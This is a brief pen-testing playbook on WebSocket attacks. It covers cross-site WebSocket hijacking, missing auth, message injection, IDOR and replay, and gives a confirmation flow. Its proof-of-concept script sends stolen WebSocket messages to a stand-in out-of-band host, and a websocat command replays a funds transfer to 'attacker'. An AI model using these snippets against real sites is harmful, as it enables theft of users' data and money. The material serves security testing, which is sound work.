# WebSocket attacks — playbook

## when to try
- Apps with `wss://` connections (chat, dashboards, trading, live notifications).
- "Real-time" anything.

## bug classes
- **No origin check (CSWSH — Cross-Site WebSocket Hijacking)**: attacker page opens `new WebSocket("wss://target/ws")` with the victim's cookies → can read+send.
- **No auth on the WS itself**: anyone can connect; auth was only on the upgrade HTTP request and not re-checked.
- **Message-level injection** (XSS, SQLi, command, deserialization): same input bugs, just delivered over WS.
- **Authorization gaps in messages**: WS message says `{"action":"get_user","id":99}` and the server doesn't check ownership → IDOR.
- **Lack of rate limit** on WS messages (DoS).
- **Replay**: capture a "place trade" message and replay later.

## confirmation flow
1. Capture the WS handshake + a few messages with Burp.
2. Hijack: from `attacker.com`, `new WebSocket('wss://t/ws')` — does it connect with cookies (browser sends them automatically)? Send a privileged message.
3. Auth-bypass: connect WITHOUT cookies/headers — if it accepts, no auth on WS.
4. IDOR via message: change the `id` field — get other users' data.
5. Inject classic payloads in fields that flow back to the UI: `<script>` for XSS in chat, etc.

## exploitation snippet
CSWSH PoC:
```html
<script>
const w = new WebSocket('wss://target/ws');
w.onopen = () => w.send(JSON.stringify({action:'get_balance'}));
w.onmessage = e => fetch('https://oob/?d='+btoa(e.data));
</script>
```

CLI replay:
```bash
websocat 'wss://t/ws' -H 'Cookie: session=...' -E
> {"action":"transfer","to":"attacker","amount":100}
```

## caveats
- Modern browsers send cookies on cross-origin WS unless SameSite=Strict.
- A "no origin check" finding without a working hijack PoC won't pay much.

## provenance
PortSwigger WebSocket labs. websocat tool.
